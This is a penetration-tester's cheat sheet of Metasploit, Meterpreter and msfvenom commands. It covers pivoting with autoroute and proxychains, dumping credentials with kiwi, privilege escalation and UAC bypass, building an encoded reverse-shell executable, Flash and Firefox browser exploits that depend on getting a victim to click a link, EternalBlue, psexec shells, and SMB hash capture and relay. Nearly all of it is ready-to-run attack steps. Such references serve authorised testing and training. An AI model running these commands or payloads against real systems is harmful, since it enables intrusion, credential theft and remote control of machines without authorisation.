# Metasploit
##### Kill Job, but not Existing Meterpreter Shell
```bash
jobs -k <Job #>
```

##### Search Modules with Grep
```bash
grep <Search String> search type:<Category>

grep smb search type:exploit
```

##### Get Module Information
```bash
use <Module Name>
info
```

##### Add Route
```bash
route add <IP> <Subnet> <Session #>
```

##### Use with Nessus
```bash
# Make sure that Postgres is running
service postgresql status
service postgresql start

load nessus
nessus_connect <Username>:<Password>@<Host>
nessus_help

# List current, Nessus scan.
nessus_scan_list

# List vulnerabilities found in a scan.
nessus_report_vulns <Scan ID>

# Import Nessus scan
nessus_db_import <Scan ID>

# List vulnerabilities from imported scan.
vulns
```

##### Nmap Scan with Metasploit

This will perform a nmap scan and feed the results into Metasploit.
```bash
msfconsole
db_nmap
```

##### Upgrade Shell to Meterpreter Shell
```bash
search to_meterpreter
use post/multi/manage/shell_to_meterpreter
set SESSION <Session ID>
# LHOST will be IP of machine establishing the shell and may not be the Attack box, in the event of pivoting.
```

# Meterpreter
### Migrate to Another Process Automatically
```bash
# As script
run post/windows/manage/migrate

# As module
use post/windows/manage/migrate
set SESSION <Session #>
run
```
### Migrate to Another Process By Name
```bash
migrate -N <Process Name>.<Extension>
```
### Pivot With Meterpreter and Proxychains
```bash
# Establish meterpreter session
# Background meterpreter
background
use post/multi/manage/autoroute
show options
set SESSION <meterpreter session #>
set NETMASK <Netmask of NIC on exploited target>
run

cat /etc/proxychains4.conf

use auxiliary/server/socks_proxy
show options
SRVPORT = 1080
VERSION = 5
set SRVPORT 9050 # Change port to match /etc/proxychains4.conf
set VERSION 4a # Does not work with version 5.  Must be 4a.
run
jobs

# Run nmap scan to find open ports that can be used with port forwarding
proxychains nmap -sT -Pn -p 21-25,80,139,445,8080 <Target Host>
```
##### [Pivoting attack traffic](https://www.youtube.com/watch?v=Wn59J8PiIl0)
##### [84 post exploitation pivoting autoroute](https://www.youtube.com/watch?v=jjUamstPDWo)
##### [Multi Manage Network Route via Meterpreter Session - Metasploit](https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/manage/autoroute)
### Dump Clear Text Credentials and Hashes
```bash
sessions -i <Session #>
load kiwi
help
creds_all
```
### Port Forwarding with Metepreter
```bash
portfwd add -l <Remote Port #> -p <Local Port #> -r <Remote Host>
portfwd list
```
### Escalate Privileges
#### Linux PrivEsc
#### Windows PrivEsc
##### Escalate Privileges with GetSystem
```bash
# Only works with Windows
getsystem

# 0: All techniques available
# 1: Named Pipe Impersonation (In Memory/Admin)
# 2: Named Pipe Impersonation (Dropper/Admin)
# 3: Token Duplication (In Memory/Admin)
# 4: Named Pipe Impersonation (RPCSS variant)
```
##### Windows Gather Privileges Enumeration
```bash
use post/windows/gather/win_privs
set SESSION <Session #>
run
```
##### Escalate Privileges Under UAC
```bash
# Determine if UAC is enabled, if so, getsystem will fail
use post/windows/gather/win_privs
set SESSION <Session #>
run

# If UAC is enabled
search bypassuac
use
set SESSION <Session #>
exploit

getsystem
```
##### Escalate with Incognito
```bash
# From Meterpreter shell
use incognito
list_tokens -u
impersonate_token <Token Name> # Escape \'s.
```
##### Exploit Unquoted Service Paths
```bash
use exploit/windows/local/unquoted_service_path
set SESSION <Session #>
exploit
```

# msfvenom
### Framework Encoders [--encoder ]
```bash
msfvenom --list encoders
```
| Name | Rank | Description |
|------|------|-------------|
| cmd/brace | low | Bash Brace Expansion Command Encoder
| cmd/echo | good | Echo Command Encoder
| cmd/generic_sh | manual | Generic Shell Variable Substitution Command Encoder
| cmd/ifs | low | Bourne ${IFS} Substitution Command Encoder
| cmd/perl | normal | Perl Command Encoder
| cmd/powershell_base64 | excellent | Powershell Base64 Command Encoder
| cmd/printf_php_mq | manual | printf(1) via PHP magic_quotes Utility Command Encoder
| generic/eicar | manual | The EICAR Encoder
| generic/none | normal | The "none" Encoder
| mipsbe/byte_xori | normal | Byte XORi Encoder
| mipsbe/longxor | normal | XOR Encoder
| mipsle/byte_xori | normal | Byte XORi Encoder
| mipsle/longxor | normal | XOR Encoder
| php/base64 | great | PHP Base64 Encoder
| ppc/longxor | normal | PPC LongXOR Encoder
| ppc/longxor_tag | normal | PPC LongXOR Encoder
| ruby/base64 | great | Ruby Base64 Encoder
| sparc/longxor_tag | normal | SPARC DWORD XOR Encoder
| x64/xor | normal | XOR Encoder
| x64/xor_context | normal | Hostname-based Context Keyed Payload Encoder
| x64/xor_dynamic | normal | Dynamic key XOR Encoder
| x64/zutto_dekiru | manual | Zutto Dekiru
| x86/add_sub | manual | Add/Sub Encoder
| x86/alpha_mixed | low | Alpha2 Alphanumeric Mixedcase Encoder
| x86/alpha_upper | low | Alpha2 Alphanumeric Uppercase Encoder
| x86/avoid_underscore_tolower | manual | Avoid underscore/tolower
| x86/avoid_utf8_tolower | manual | Avoid UTF8/tolower
| x86/bloxor | manual | BloXor - A Metamorphic Block Based XOR Encoder
| x86/bmp_polyglot | manual | BMP Polyglot
| x86/call4_dword_xor | normal | Call+4 Dword XOR Encoder
| x86/context_cpuid | manual | CPUID-based Context Keyed Payload Encoder
| x86/context_stat | manual | stat(2)-based Context Keyed Payload Encoder
| x86/context_time | manual | time(2)-based Context Keyed Payload Encoder
| x86/countdown | normal | Single-byte XOR Countdown Encoder
| x86/fnstenv_mov | normal | Variable-length Fnstenv/mov Dword XOR Encoder
| x86/jmp_call_additive | normal | Jump/Call XOR Additive Feedback Encoder
| x86/nonalpha | low | Non-Alpha Encoder
| x86/nonupper | low | Non-Upper Encoder
| x86/opt_sub | manual | Sub Encoder (optimised)
| x86/service | manual | Register Service
| x86/shikata_ga_nai | excellent | Polymorphic XOR Additive Feedback Encoder
| x86/single_static_bit | manual | Single Static Bit
| x86/unicode_mixed | manual | Alpha2 Alphanumeric Unicode Mixedcase Encoder
| x86/unicode_upper | manual | Alpha2 Alphanumeric Unicode Uppercase Encoder
| x86/xor_dynamic | normal | Dynamic key XOR Encoder

### Framework Platforms [--platform ]
```bash
msfvenom --list platforms
```
| Name |
|------|
| aix
| android
| apple_ios
| brocade
| bsd
| bsdi
| cisco
| firefox
| freebsd
| hardware
| hpux
| irix
| java
| javascript
| juniper
| linux
| mainframe
| multi
| netbsd
| netware
| nodejs
| openbsd
| osx
| php
| python
| r
| ruby
| solaris
| unifi
| unix
| unknown
| windows

### Formats
```bash
msfvenom --list formats
```
##### Framework Executable Formats [--format ]
| Name |
|------|
| asp
| aspx
| aspx-exe
| axis2
| dll
| elf
| elf-so
| exe
| exe-only
| exe-service
| exe-small
| hta-psh
| jar
| jsp
| loop-vbs
| macho
| msi
| msi-nouac
| osx-app
| psh
| psh-cmd
| psh-net
| psh-reflection
| vba
| vba-exe
| vba-psh
| vbs
| war

##### Framework Transform Formats [--format ]
| Name |
|------|
| bash
| c
| csharp
| dw
| dword
| hex
| java
| js_be
| js_le
| num
| perl
| pl
| powershell
| ps1
| py
| python
| raw
| rb
| ruby
| sh
| vbapplication
| vbscript

### Framework Architectures [--arch ]
```bash
msfvenom --list archs
```

| Name |
|------|
| aarch64
| armbe
| armle
| cbea
| cbea64
| cmd
| dalvik
| firefox
| java
| mips
| mips64
| mips64le
| mipsbe
| mipsle
| nodejs
| php
| ppc
| ppc64
| ppc64le
| ppce500v2
| python
| r
| ruby
| sparc
| sparc64
| tty
| x64
| x86
| x86_64
| zarch

### Framework Encryption Formats [--encrypt ]
```bash
msfvenom --list encrypt
```

| Name |
|------|
| aes256
| base64
| rc4
| xor

### Payload Options
```bash
# msfvenom -p PAYLOAD --list-options
$ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options
```

###

##### Windows Meterpreter Reverse Shell with Encoding
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LHOST=<Port #> -f exe -e x86/shikata_ga_nai -o <Outpuf File>
```

# Client-Side Exploits
### Exploit Client with Adobe Flash
##### UAF
```bash
msfconsole -q
user exploit/multi/browser/adobe_flash_hacking_team_uaf
show options
set LHOST <Attack Machine>

show targets
set TARGET <Target #>

show payloads
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp

exploit

# Get victim to click the link that is generated by Metasploit.
```

### Exploit Client with Firefox
##### PDFJS
```bash
msfconsole -q
user exploit/multi/browser/firefox_pdfjs_privilege_escalation
show options

show targets

show payloads
set PAYLOAD payload/firefox/shell_reverse_tcp
exploit

# Get victim to click the link that is generated by Metasploit.
```

# Remote Exploits
##### EternalBlue
```bash
msfconsole -q

# Scan target to determine if it is vulnerable to EternalBlue.
use auxiliary/scanner/smb/smb_ms17_010 
show options
set RHOSTS <Target Host>
# Set SMBDomain, SMBUser, SMBPass settings, if available.
run

use windows/smb/ms17_010_eternalblue
show options
set RHOSTS <Target Host>
# Set SMBDomain, SMBUser, SMBPass settings, if available.
exploit
```

# Services
### Finger
##### Enumerate Users with Finger
```bash
msfconsole -q
search finger
use auxiliary/scanner/finger/finger_users
use 1
show options

set RHOSTS <SMTP Host>
set USERS_FILE <Wordlist>
run
```

### SMB
##### Establish Reverse Shell with SMB
```bash
msfconsole
use exploit/windows/smb/psexec
set RHOSTS <Target Host>
set SMBUser <Username>
set SMBPass <Password>
exploit
```

##### Capture SMB Hashes
```bash
msfconsole
use auxiliary/server/capture/smb
show options

# Do not change the challenge, as there are rainbow tables built for this challenge.
set JOHNWPFILE hashes
run
```

##### SMB Relay
```bash
msfconsole
use exploit/windows/smb/smb_relay
show options

set SMBHOST <Target Host>
```

### SMTP
##### Enumerate SMTP Users
```bash
msfconsole -q
search smtp_enum

use auxiliary/scanner/smtp/smtp_enum
# or
use 0
show options

set RHOSTS <SMTP Host>
set USER_FILE <Wordlist>
run
```

### VNC
##### Reverse Shell with VNC
```bash
msfconsole -q
use exploit/multi/vnc/vnc_keyboard_exec
show options

set RHOSTS <Target Host>
set PASSWORD <Password>

show targets
set TARGET <Target #>

show payloads
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD windows/meterpreter/reverse_tcp
```

# Cheatsheets
[MSFVenom Reverse Shell Payload Cheatsheet (with & without Meterpreter)](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

# References
[Deep Dive Into Stageless Meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)

[Metasploit Module Library](https://www.infosecmatter.com/metasploit-module-library/)